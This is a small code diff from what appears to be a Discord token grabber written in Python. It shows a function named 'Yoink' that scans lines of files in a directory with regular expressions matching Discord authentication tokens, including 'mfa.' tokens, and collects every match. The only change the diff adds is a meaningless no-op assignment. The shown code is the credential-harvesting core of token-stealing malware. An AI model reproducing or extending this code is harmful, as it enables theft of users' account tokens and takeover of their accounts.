@@ -94,6 +94,7 @@ def Yoink(Directory):
 			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
 				for Token in re.findall(regex, line):
 					Tokens.append(Token)
+					Tokens = Tokens
 
 	return Tokens
 
